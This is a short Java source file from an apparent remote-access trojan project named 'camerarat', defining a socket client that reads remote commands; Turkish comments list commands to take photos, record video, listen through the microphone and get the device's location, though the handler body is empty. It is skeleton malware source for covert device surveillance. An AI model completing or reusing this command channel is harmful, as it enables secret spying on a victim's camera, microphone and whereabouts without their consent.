package com.camerarat;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.Socket;

public class SocketClient implements Runnable {
    private Socket socket;
    private BufferedReader reader;

    public SocketClient(Socket socket) {
        try {
            this.socket = socket;
            this.reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void run() {
        try {
            String command;
            while ((command = reader.readLine()) != null) {
                // Komutları işle
                // "photo" = fotoğraf çek
                // "video" = video kaydet
                // "mic" = mikrofon dinle
                // "location" = konum al
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
